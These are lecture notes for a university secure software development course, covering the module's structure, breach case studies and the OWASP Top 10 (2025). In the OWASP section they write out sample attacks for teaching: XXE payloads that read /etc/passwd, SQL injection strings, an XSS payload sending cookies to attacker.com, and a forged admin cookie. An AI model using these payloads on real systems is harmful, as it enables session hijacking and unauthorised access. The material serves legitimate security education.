# ICT2216 Secure Software Development
## Lecture 1: Module Overview & Secure Software Concepts

---

## Part 1 — Module Overview

### Teaching Team

- **First half:** Tram Truong Huu
- **Second half:** Raymond Chan
- **Labs:** Raymond Chan, Tram Truong Huu, Marcus Tan

---

### General Information

- **Lectures:** Every Thursday, 9 am – 11 am (Zoom)
- **Labs:** Every Thursday
  - P1: 1 pm – 3 pm
  - P2: 3 pm – 5 pm
  - Lab room: E2-07-14

---

### Why Study Secure Software Development?

Before the boring details — how are the big companies doing?

**Anthropic's AI Coding Tools (Slide 5)**

Anthropic's AI coding tool leaked its own source code **twice in a year** — notably, this was a *packaging mistake* rather than a hack. Even a security-focused AI company is not immune to operational security failures.

Reference: https://www.ndtv.com/science/anthropics-ai-coding-tool-leaks-its-own-source-code-for-the-second-time-in-a-year-11291517

**HSBC India: The Uppercase Migration (Slide 6)**

Beginning April 6, 2026, HSBC India required its internet banking customers to enter passwords in **uppercase letters only**.

Standard cybersecurity practice dictates that credentials must be stored as **one-way hashes**, making the original input — including its casing — completely unreadable by the bank. It should be literally impossible for a vendor to know your credentials' casing unless they are not storing passwords as hashes.

This anomaly fuelled industry speculation about:
- **Plaintext password storage**, or
- Deeply flawed **legacy security practices**

Additionally, by eliminating lowercase letters from the allowable character set, the bank **effectively cuts the password option space in half** — dramatically reducing brute-force resistance.

**Cisco (Slide 7)**

Cisco continuously publishes security advisories for its Identity Services Engine:

Reference: https://www.cisco.com/c/en/us/support/security/identity-services-engine/products-security-advisories-list.html

**Am I a Victim? (Slide 8)**

The slide shows the **Have I Been Pwned (HIBP)** website — a service that lets you check if your email address appears in known data breaches.

At the time of the slide:
- **14,949,479,875** pwned accounts indexed
- **115,799** pastes monitored
- **229,165,825** paste accounts tracked

Notable breaches shown: Collection #1, Verifications.io, Onliner Spambot, Doner Kebab, Hunt's Mailchimp List

> **Key message:** Data breaches are pervasive and affect billions of accounts across hundreds of services. Understanding secure software development helps prevent your software from contributing to these statistics.

---

### Question Time (Slide 9)

**For SE students:** In your previous modules, did you consider security when doing your project?

**For IS students:** In your previous modules, did you learn how to validate whether an application is secure or not?

---

### IS vs SE — Not Civil War, Collaboration (Slide 10)

This module bridges two disciplines that have historically operated separately:

| IS Students bring… | SE Students bring… |
|---|---|
| ICT2212 Ethical Hacking | INF2001 Introduction to Software Engineering |
| ICT2213 Applied Cryptography | INF2002 Human Computer Interaction |
| ICT2214 Web Security | ICT2004 Embedded Systems Programming |
| ICT2215 Mobile Security | ICT2007 Mobile Application Development |
| ICT2217 Network Security | ICT2112 Software Design |
| | ICT2113 Software Modelling and Analysis |

The module is **not** for IS and SE students to fight each other — both groups **must work together** to complete a shared project.

---

### Why Take This Module? (Slide 12)

- **Learn from mistakes** — real-world security failures teach more than theory alone
- Develop a **security mindset** when designing applications
- Learn and apply **essential engineering principles and processes** to secure software development
- Understand **security development life cycles**, best practices, secure coding, and software quality maintenance

---

### Module Outline (Slide 13)

Security is prefixed to every phase of the traditional SDLC:

1. **Secure Software Concepts**
2. **Secure Software Requirements** — Risk Evaluation Guideline and Requirements Criteria Document
3. **Secure Software Design** — Security Design Review Guideline and Threat Modeling Guideline
4. **Secure Software Implementation/Coding** — Security Coding Guide
5. **Secure Software Testing** — Activities-level, Security Testing Guideline
6. **Secure Software Deployment** — Vulnerability Management and Incident Response Guideline

---

### Secure Software Development Life Cycle (Slide 14)

The SSDLC is a continuous loop integrating security at every stage:

```
Requirements Definition
        ↓
   Secure Requirements Review
        ↓
   Secure Design Review
        ↓
   Develop  ←──────────────────┐
        ↓                       │
   Secure Code Review           │
        ↓                       │
   Deploy / Implement           │
        ↓                       │
   Penetration Testing          │
        ↓                       │
   Maintain ───────────────────┘
```

Security activities (Secure Requirements Review, Secure Design Review, Secure Code Review, Penetration Testing) are embedded at each transition between SDLC phases — not bolted on at the end.

---

### Security Quality Gates (Slide 15)

Quality gates are formal checkpoints that must be passed before a project can proceed to the next phase:

| Gate | Phase Transition | Key Activity |
|---|---|---|
| **Gate 1** | Concept/Priority → Project Definition | High-level security risk assessment, risk-based controls selection |
| **Gate 2** | Project Definition → Preliminary Design | Agreement on security requirements and controls |
| **Gate 3** | Preliminary Design → Detailed Design & Development | Security Design Review, Source Code Agreement |
| **Gate 4** | Detailed Design → Deployment | Penetration Testing, Third-party Assessment, Approve Build |

No phase can begin until its corresponding gate is passed — ensuring security is validated at each transition.

---

### Sprint + Security (Slide 16)

Two approaches for integrating security into Agile sprints:

**Security Sprint Approach:**
- A dedicated sprint focusing **exclusively** on application security
- All stories implemented during this sprint are security-related
- Code is reviewed
- Stories may include:
  - Input validation story
  - Logging story
  - Authentication story
  - Authorisation story
  - Technical risks: XSS, SQL injection, etc.

**Every Sprint Approach (Preferred — similar to Microsoft SDL):**
- Security requirements and stories are included in **every** sprint
- No software should ever be released without security requirements being met
- Sprint length: 2 weeks to 2 months
- Every security requirement in the "every-sprint" category must be completed in each and every sprint
  - If not completed, the sprint is deemed **incomplete** and software cannot be released

---

### Learning Outcomes (Slide 17)

1. Recognise the need for security practices in different phases of a software development lifecycle
2. Model secure software requirements and threats with suitable UML diagrams
3. Apply appropriate security principles to secure software design
4. Implement secure software coding with reference to recommended best practices
5. Perform secure software verification using suitable tools and techniques

---

### Schedule (TBC) (Slide 18)

| S/No | Topics | Lectures (hours) | Labs (hours) |
|---|---|---|---|
| 1 | Secure Software Concepts | 2 | 2 |
| 2 | Secure Software Requirements | 2 | 2 |
| 3 | Secure Software Design | 5 | 5 |
| 4 | Secure Software Implementation/Coding | 8 | 8 |
| 5 | Secure Software Testing | 4 | 4 |
| 6 | Secure Software Deployment | 3 | 3 |
| | **Total** | **24** | **24** |

---

### Assessment (Slide 19)

| Assessment Task | Weightage |
|---|---|
| One-page project proposal | 5% |
| Project Deliverable 1: Secure Software Requirements & Design | 20% |
| Project Deliverable 2: Secure Software Implementation | 25% |
| Project Deliverable 3: Secure Software Verification | 20% |
| Quizzes and Practical Test (Individual) | 30% |

---

### Individual Assessment (Slide 20)

- **1 Quiz** — Week 6, 11 June 2026
- **1 Practical Test** — Week 12, 23 July 2026

---

### Advice (Slide 21)

- Do not hesitate to ask questions, offer your point of view, share your experiences — other people in the audience may have similar questions
- Do not hesitate to report potential bugs or errors
- Do not hesitate to look for solutions on the internet
- There is **no perfect solution** when developing an application
- **Learn from mistakes and dramas!**

---

### Lab 1 (Slide 22)

- Physical lab this afternoon
- Project details announced
- Form your dream team:
  - Size: **7 to a maximum of 8 members** in the same lab group
  - Strictly follow the team formation table:

| Session | Groups | IS Students | SE Students | Composition |
|---|---|---|---|---|
| **P1** | 18 groups | 78 IS | 54 SE | 12 groups of 4, 06 groups of 5 / 18 groups of 3 |
| **P2** | 18 groups | 76 IS | 55 SE | 14 groups of 4, 04 groups of 5 / 17 groups of 3, 01 group of 4 |

---

### References (Slide 23)

- *Secure Programming with Python* — Tamaghna Basu: https://www.amazon.com/Secure-Programming-Python-Tamaghna-Basu/dp/1786466465
- *Microsoft Security Development Lifecycle*: https://www.microsoft.com/en-us/securityengineering/sdl
- *Software Security: Building Security In* — Gary McGraw: https://www.amazon.com/Software-Security-Building-Gary-McGraw/dp/0321356705
- *Threat Modeling: Designing for Security* — Adam Shostack: https://www.amazon.com/Threat-Modeling-Designing-Adam-Shostack/dp/1118809998

---
---

## Part 2 — Secure Software Concepts

### Agenda (Slide 2)

- Relationship between Software and Security
- Case studies
- Software Vulnerabilities
  - OWASP Top 10
- Vulnerability Tracking
  - CVEs, NVD, CAPEC, MITRE ATT&CK
- Software Assurance Methodologies
  - BSIMM, OpenSAMM, Microsoft SDLC

---

### Relationship Between Software and Security (Slides 3–4)

> "We have a firewall and IDS already — why do we need to consider security in the application layer?"

Network-level controls (firewall, IDS) operate at lower layers of the stack. They cannot inspect or protect against vulnerabilities in the **application logic** itself — SQL injection, XSS, broken authentication, and insecure design all happen at the application layer, above what network controls can see.

**The CIA Triad applies at every layer:**

```
         CONFIDENTIALITY
               │
INFORMATION SECURITY
          /         \
AVAILABILITY     INTEGRITY
```

Even with a firewall and IDS in place, if the application itself leaks data (confidentiality), allows unauthorised modifications (integrity), or can be made unavailable through application-level attacks (availability), the CIA triad is violated.

---

### Case Studies (Slides 5–8)

**X (Twitter) Insider Data Breach (Slide 6)**

X (formerly Twitter) reportedly suffered a significant data breach involving approximately **2.8 billion user profiles**. According to hackers on Breach Forums, the breach originated from a **disgruntled X employee** who exfiltrated the data during a period of mass layoffs at the company. A user with the handle "ThinkingOne" released a ~400 GB dataset on March 28, 2025.

Key points:
- The breach was allegedly perpetrated by an **insider threat** — an employee with privileged access
- Neither X nor mainstream media initially acknowledged or reported on the breach
- Highlights that **insider threats** are among the most difficult security risks to prevent through technical controls alone

**More Case Studies — Europcar (Slide 7)**

A threat actor infiltrated the **GitLab repositories** of Europcar Mobility Group (international car rental company):
- Stole source code for Android and iOS apps
- Stole personal data of at least **200,000 customers**
- Attempted to extort Europcar by threatening to expose **37 GB** of stolen data

**Gladinet CentreStack — CVE-2025-30406 (Slide 8)**

A critical vulnerability (CVSS 9.0) was discovered in Gladinet CentreStack, a popular file sharing and collaboration platform. Added to CISA's Known Exploited Vulnerabilities (KEV) catalog.

**Root cause:** A **hard-coded `machineKey`** in the IIS `web.config` file. This allowed attackers to forge ViewState payloads for **server-side deserialization**, leading to Remote Code Execution (RCE).

- Exploited as a **zero-day in March 2025**
- Patch released in version 16.4.10315.56368 (April 3, 2025)
- Temporary mitigation: rotate the `machineKey` value

> **Secure coding lesson:** Hard-coded cryptographic keys are a critical vulnerability (OWASP A04 Cryptographic Failures). This is also an example of insecure deserialization (OWASP A08).

---

### Why Do These Happen? (Slide 9)

- **Companies never tell you how they handle your data** — e.g., Google Voice: how is voice data processed? How is accuracy improved?
- **Security not considered in the initial design phase** — it is an afterthought, not a foundation
- **Mistakes during the development process** — developers are human
- **Not enough time to conduct security review before launch:**
  - Rush to deliver software and bring it to production
  - "Is 3 days too long?" — teams often skip security review entirely under deadline pressure

---

### Code Exercise (Slide 13)

```c
int balance;

void decrease(int amount) {
    if (balance >= amount)
        balance = balance - amount;
    else
        printf("Insufficient funds\n");
}

void increase(int amount) {
    balance = balance + amount;
}
```

**What are the problems with these functions?**

1. **`balance` is a global variable** — any part of the program can read or modify it directly, bypassing the intended access control of the `decrease()` and `increase()` functions
2. **No bounds checking on `increase()`** — adding a very large positive `amount` could cause **integer overflow**, wrapping the balance around to a very large negative number (or vice versa)
3. **No thread safety** — if two threads call `decrease()` or `increase()` simultaneously on the same `balance` variable, a **race condition** could corrupt the balance (e.g., a double-spend if two concurrent decrements both read the same balance before either writes back)
4. **No input validation on `amount`** — what if `amount` is negative? `increase(-100)` would decrease the balance; `decrease(-100)` with a negative amount would pass the `balance >= amount` check and increase the balance

---

### Software Vulnerabilities (Slide 15)

Too many to enumerate individually. Broad categories:

1. **Access Control Vulnerabilities** — inadequate restrictions on who can access what
2. **Data Storage Vulnerabilities** — sensitive data stored insecurely (plaintext, weak encryption)
3. **Buffer Overflow Vulnerabilities** — writing beyond the bounds of allocated memory
4. **Authentication, Authorisation, or Cryptographic Vulnerabilities** — flaws in identity verification, access decisions, or cryptographic implementations
5. **Validation Vulnerabilities** — accepting malformed or malicious input

---

### OWASP Top 10 (2025) (Slides 17–43)

Reference: https://owasp.org/www-project-top-ten/

**Changes from 2021 to 2025:**

| 2021 | 2025 | Change |
|---|---|---|
| A06 – Vulnerable and Outdated Components | A03 – Software Supply Chain Failures | Expanded scope beyond known CVEs to all supply chain failures |
| A07 – Identification and Authentication Failures | A07 – Authentication Failures | Renamed (simplified) |
| A09 – Security Logging and Monitoring Failures | A09 – Security Logging and Alerting Failures | Renamed (alerting added) |
| A10 – SSRF | A10 – Mishandling of Exceptional Conditions | Replaced with new category |

---

#### A01:2025 — Broken Access Control

Access control enforces policy such that users cannot act outside their intended permissions. Failures typically lead to unauthorised information disclosure, modification, or destruction.

**Scenario 1 — Parameter tampering in SQL:**
```java
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery();
```
An attacker modifies the `acct` parameter in the browser:
```
http://example.com/app/accountInfo?acct=notmyacct
```
If not properly verified, the attacker can access any user's account.

**Scenario 2 — Force browsing to admin pages:**
```
http://example.com/app/getappInfo         ← accessible without auth?
http://example.com/app/admin_getappInfo   ← accessible without admin role?
```
If an unauthenticated user can access either page, or a non-admin can access the admin page, it is a broken access control flaw.

**Case Study — Instagram (Laxman Muthiyah):**

The bug was found in Instagram's forgot-password endpoint. The attack consisted of three steps:
1. Trigger a password reset for a victim account
2. Request a recovery code (a 6-digit code — 1,000,000 possible values)
3. Brute-force all possible recovery codes via POST requests

**The flaw:** Rate limiting was applied **by IP address**, but **not by account**. By rotating IP addresses, the attacker could try all 1,000,000 possible codes without being blocked, leading to a full account takeover.

---

#### A02:2025 — Security Misconfiguration

Security misconfiguration is the most commonly seen issue, resulting from insecure default configurations, incomplete configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages.

**Scenario 1:** Application server ships with sample applications that are not removed from the production server. These have known security flaws. If the sample includes an admin console with default credentials unchanged, the attacker logs in with default passwords and takes over.

**Scenario 2:** Directory listing is not disabled on the server. An attacker discovers they can list directories, finds and downloads compiled Java `.class` files, decompiles them, reverse-engineers the source code, and discovers a serious access control flaw.

**Scenario 3:** Application server is configured to return **detailed error messages including full stack traces** to users. This potentially exposes:
- Sensitive information (file paths, database schema)
- Component versions that are known to be vulnerable

**Scenario 4:** A cloud service provider (CSP) has **default sharing permissions open to the internet**. Sensitive data stored in cloud storage is accessible to anyone.

**XML External Entities (XXE) — Three Attack Scenarios:**

XXE attacks exploit XML parsers that process external entity references embedded in XML documents:

*Scenario 1 — Extract server files:*
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```
The parser reads `/etc/passwd` and returns its contents in the XML response.

*Scenario 2 — Server-Side Request Forgery (probe internal network):*
```xml
<!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]>
```
Forces the server to make an HTTP request to an internal address, leaking internal network topology and services.

*Scenario 3 — Denial of Service (infinite file):*
```xml
<!ENTITY xxe SYSTEM "file:///dev/random" >]>
```
The parser attempts to read from `/dev/random` (an infinite source of random bytes), hanging the server.

---

#### A03:2025 — Software Supply Chain Failures

**Background:**
- Top-ranked in the 2025 community survey — **50% of respondents ranked it #1**
- Evolved from "A09:2013 – Using Components with Known Vulnerabilities" to cover **all supply chain failures**, not just those with assigned CVEs
- Only **11 CVEs** have related CWEs, making this category difficult to track — the risk is larger than the numbers suggest

**Attack Scenarios:**

*Scenario 1:* A trusted vendor is compromised with malware. Your systems are compromised when you install the next legitimate-looking update from that vendor.

*Scenario 2:* A trusted vendor is compromised such that it **behaves maliciously only under specific conditions** — making detection extremely difficult.

*Scenario 3:* Components typically run with the **same privileges as the application itself**. A flaw in any component — whether accidental (coding error) or intentional (backdoor) — can have the same impact as a flaw in your own code.

**Real-world examples:**

- **SolarWinds (2019):** The SolarWinds Orion update mechanism was subverted. A highly targeted malicious update was distributed to more than **18,000 organisations**, of which around 100 were actively affected. One of the most significant breaches in history.
  Reference: https://www.npr.org/2021/04/16/985439655/a-worst-nightmare-cyberattack-the-untold-story-of-the-solarwinds-hack

- **Bybit (2025):** **$1.5 billion** stolen via a supply chain attack in wallet software. The malicious code executed **only when the specific target wallet was being used**, making it nearly impossible to detect during normal testing.

- **Log4Shell — CVE-2021-44228:** An Apache Log4j remote code execution zero-day vulnerability. Exploited for ransomware campaigns, cryptomining, and other attack campaigns affecting millions of systems worldwide.

---

#### A04:2025 — Cryptographic Failures

Formerly known as "Sensitive Data Exposure," this category focuses on **failures related to cryptography** — or the complete absence of it — that lead to exposure of sensitive data.

**Key questions to ask:**
- Is any data transmitted in **cleartext**? (HTTP, SMTP, FTP — external internet traffic is especially dangerous)
- Are **old or weak cryptographic algorithms** used by default or in legacy code?
- Are **default, weak, or reused crypto keys** in use? Is key management or rotation missing?
- Is **encryption not enforced** (missing security directives or HTTPS-only headers)?
- Does the user agent fail to **verify server certificates**?

**Discussion questions from the slide:**
- Is it safe to store an API key directly in your source code? ❌
- Is it OK to store a plaintext password in a Dockerfile? ❌

**Scenario 1 — Decrypt-on-retrieve defeats encryption:**
```sql
SELECT fld_user, fld_pwd, AES_DECRYPT(fld_encryptedpwd, 'key')
FROM users WHERE fld_id='1903'
```
An application encrypts credit card numbers in the database using automatic database encryption. However, data is automatically decrypted when retrieved. An SQL injection flaw allows an attacker to retrieve credit card numbers in **cleartext** — the encryption at rest is meaningless if the application-level decryption key is accessible.

**Scenario 2 — Missing or optional TLS → session hijacking:**
A site does not enforce TLS for all pages, or supports weak encryption. An attacker on an insecure wireless network:
1. Monitors network traffic
2. Downgrades connections from HTTPS to HTTP
3. Intercepts requests and **steals the user's session cookie**
4. Replays the cookie to hijack the authenticated session — accessing or modifying private data, or altering money transfer recipients

**Scenario 3 — Unsalted hashes → rainbow table / GPU cracking:**
The password database uses **unsalted or simple hashes**. A file upload flaw lets an attacker retrieve the password database. All unsalted hashes can be cracked using a **rainbow table of pre-calculated hashes**. Even salted hashes generated by fast functions (MD5, SHA-1) can be cracked by GPUs in reasonable time.

---

#### A05:2025 — Injection (including XSS)

Injection flaws occur when an application sends untrusted data to an interpreter as part of a command or query.

**SQL Injection — Scenario 1 (direct string concatenation):**
```java
String query = "SELECT * FROM accounts WHERE custID='"
               + request.getParameter("id") + "'";
```
Attack:
```
http://example.com/app/accountView?id=' or '1'='1
```

**SQL Injection — Scenario 2 (Hibernate Query Language):**
```java
Query HQLQuery = session.createQuery(
    "FROM accounts WHERE custID='" + request.getParameter("id") + "'");
```
Even ORM frameworks are vulnerable if string concatenation is used instead of parameterised queries. The same `' or '1'='1` attack applies.

**Cross-Site Scripting (XSS)**

Three forms of XSS, all targeting the **victim's browser**:

| Type | Description |
|---|---|
| **Reflected XSS** | Application/API includes unvalidated user input as part of HTML output in the immediate response |
| **Stored XSS** | Application/API stores unsanitised user input; it is displayed to another user or admin at a later time |
| **DOM XSS** | JavaScript frameworks or single-page applications dynamically include attacker-controllable data into the page |

**XSS Attack Scenario:**
```java
// Vulnerable code
page += "<input name='creditcard' type='TEXT' value='"
        + request.getParameter("CC") + "'>";
```
Attacker supplies the following as the `CC` parameter:
```
'><script>document.location=
'http://www.attacker.com/cgi-bin/cookie.cgi?
foo='+document.cookie</script>'
```
Result: The victim's session ID is sent to the attacker's website, allowing the attacker to hijack the user's current authenticated session.

---

#### A06:2025 — Insecure Design

A category focused on **design flaws** — introduced in 2021 — as opposed to implementation bugs. Requires:
- Use of **threat modeling**
- Application of **secure design patterns** and **reference architectures**
- **Pre-code activities** critical to Secure by Design principles

> **Key distinction:** Insecure design is a flaw in the *design* — even a perfect implementation of a bad design is insecure. Implementation defects are bugs in code that implements an otherwise correct design. Both matter, but design flaws are more expensive to fix late.

**Scenario 1 — Credential recovery via "secret questions":**
A credential recovery workflow using "questions and answers" (e.g., "What is your mother's maiden name?") is **prohibited by NIST 800-63b**, the OWASP ASVS, and the OWASP Top 10. Questions and answers cannot be trusted as evidence of identity because more than one person can know the answers. This code must be removed and replaced with a more secure design.

**Scenario 2 — Missing rate limits on group bookings:**
A cinema chain allows group booking discounts with a maximum of 15 attendees before requiring a deposit. Attackers could threat-model this flow and test whether they could **book 600 seats across all cinemas simultaneously** in a few requests — causing a massive loss of income with no technical barrier to stop them.

---

#### A07:2025 — Authentication Failures

Formerly "Identification and Authentication Failures." Covers failures in confirming the user's identity, authentication, and session management.

**Scenario 1 — Credential stuffing:**
Attackers use lists of known (previously breached) username/password pairs to attempt logins. If an application does not implement automated threat or credential stuffing protections, it becomes a **password oracle** — an attacker can systematically determine which credentials are valid.

**Scenario 2 — Password rotation and complexity policies backfire:**
Password rotation and complexity requirements are viewed as encouraging users to use and reuse **weak passwords** (e.g., `Summer2024!`, `Summer2025!`). Organisations are recommended to **stop these practices** per NIST 800-63 and use **multi-factor authentication** instead.

**Scenario 3 — Session timeout not set:**
A user accesses an application on a **public computer**. Instead of logging out, they simply close the browser tab and walk away. An attacker uses the same browser one hour later and **the user is still authenticated** — because no session timeout was configured.

---

#### A08:2025 — Software and Data Integrity Failures

New category since 2021. Focuses on code and infrastructure that does not protect against integrity violations — covering insecure CI/CD pipelines, missing integrity checks on updates, and insecure deserialization (which was a standalone category in 2017).

**Scenario 1 — Unsigned firmware updates:**
Many home routers, set-top boxes, and device firmware do not verify updates via **signed firmware**. Unsigned firmware is a growing target for attackers. Once a device is compromised through a malicious update, there is often no remediation mechanism other than a future firmware release.

**Scenario 2 — SolarWinds malicious update (cross-reference with A03):**
Nation-states attacked SolarWinds' secure build and update integrity processes. Despite the company having security practices in place, the build process was subverted. A malicious update was distributed to more than 18,000 organisations — one of the most significant integrity failures in history.

**Scenario 3 — Insecure Deserialization (Java):**
A React application calls Spring Boot microservices. To maintain immutability, user state is serialised and passed with each request. An attacker notices the `R00` Java object signature in the serialised data and uses the **Java Serial Killer** tool to achieve **Remote Code Execution** on the application server.

**Scenario 4 — Insecure Deserialization (PHP cookie tampering):**

Original serialised cookie (user role = `user`):
```
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

Attacker modifies the serialised object, changing role from `user` to `admin` and adjusting the field lengths accordingly:
```
a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";
i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

If the application deserialises this cookie without verification, the attacker gains **admin privileges**.

**Discussion question (Slide 39):**
> Do you update your OS / IDE / libraries regularly? Why or why not?

---

#### A09:2025 — Security Logging & Alerting Failures

Insufficient logging, detection, monitoring, and active response occurs when any of the following are true:

- **Auditable events** (logins, failed logins, high-value transactions) are **not logged**
- Warnings and errors generate **no, inadequate, or unclear log messages**
- Application and API logs are **not monitored** for suspicious activity
- Logs are **only stored locally** (vulnerable to being wiped after a compromise)
- **Alerting thresholds and escalation processes** are not in place or not effective
- Penetration testing and DAST scans **do not trigger alerts**
- The application is **unable to detect, escalate, or alert** for active attacks in real time

**Scenario 1 — Children's health plan data breach (7+ years undetected):**
A children's health plan provider's website could not detect a breach due to a lack of monitoring and logging. An external party informed the provider that an attacker had accessed and modified thousands of sensitive health records of **more than 3.5 million children**. Post-incident review found significant unaddressed vulnerabilities. The data breach **could have been in progress since 2013** — a period of more than **seven years** — with no detection.

**Scenario 2 — Major Indian airline (10+ years of data):**
A major Indian airline suffered a breach involving **more than ten years' worth of personal data** of millions of passengers, including passport and credit card data. The breach occurred at a **third-party cloud hosting provider**, who notified the airline of the breach after some time.

**Scenario 3 — Major European airline (GDPR fine):**
A major European airline suffered a GDPR-reportable breach. Payment application security vulnerabilities were exploited by attackers who harvested **more than 400,000 customer payment records**. The airline was **fined £20 million** by the privacy regulator.

---

#### A10:2025 — Mishandling of Exceptional Conditions *(New in 2025)*

A new category in 2025, focusing on:
- **Improper error handling**
- **Logical errors**
- **Failing open** (defaulting to allow when an error occurs, rather than deny)
- Other abnormal conditions

Some CWEs previously associated with poor code quality are now captured here:

| CWE | Description |
|---|---|
| CWE-209 | Generation of Error Messages Containing Sensitive Information |
| CWE-234 | Failure to Handle Missing Parameter |
| CWE-274 | Improper Handling of Insufficient Privileges |
| CWE-476 | NULL Pointer Dereference |
| CWE-636 | Not Failing Securely ("Failing Open") |

**Scenario 1 — Resource exhaustion via exception mishandling (DoS):**
An application catches exceptions during file uploads but **does not properly release resources** after the exception. Each new exception leaves resources locked or unavailable. Once all resources are consumed, the application becomes unavailable — a self-induced Denial of Service.

**Scenario 2 — Sensitive data exposure via database errors:**
Improper handling of database errors reveals full system error details to the user (stack traces, SQL queries, table names). The attacker deliberately forces errors to use this **reconnaissance information** to craft more effective SQL injection attacks.

**Scenario 3 — Race condition / state corruption in financial transactions:**
A multi-step transaction executes in order: (1) debit user account, (2) credit destination account, (3) log transaction. If the system fails partway through and **does not roll back the entire transaction** (failing open rather than closed), an attacker could:
- **Drain the user's account** without the credit reaching the destination
- Exploit a race condition to **send money to the destination multiple times**

---

### Summary — OWASP Top 10 (2025)

| Rank | Category | Core Risk |
|---|---|---|
| A01 | Broken Access Control | Users can access data or functions outside their permissions |
| A02 | Security Misconfiguration | Insecure defaults, unnecessary features, open cloud storage, verbose errors |
| A03 | Software Supply Chain Failures | Compromised components, malicious updates, third-party code risks |
| A04 | Cryptographic Failures | Sensitive data exposed due to missing or weak encryption |
| A05 | Injection (incl. XSS) | Untrusted data sent to interpreters (SQL, HTML, OS) as commands |
| A06 | Insecure Design | Security not considered during design; no threat modelling |
| A07 | Authentication Failures | Credential stuffing, no MFA, improper session timeouts |
| A08 | Software & Data Integrity Failures | Unsigned updates, insecure CI/CD, insecure deserialization |
| A09 | Security Logging & Alerting Failures | Breaches go undetected; no monitoring, alerting, or audit trail |
| A10 | Mishandling of Exceptional Conditions | Failing open on errors; sensitive info in error messages; race conditions |

---

### References

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Microsoft SDL: https://www.microsoft.com/en-us/securityengineering/sdl
- *Software Security: Building Security In* — Gary McGraw
- *Threat Modeling: Designing for Security* — Adam Shostack
- Have I Been Pwned: https://haveibeenpwned.com/
- SolarWinds Hack: https://www.npr.org/2021/04/16/985439655/a-worst-nightmare-cyberattack-the-untold-story-of-the-solarwinds-hack
- Cisco Security Advisories: https://www.cisco.com/c/en/us/support/security/identity-services-engine/products-security-advisories-list.html

---

*End of Lecture 1*
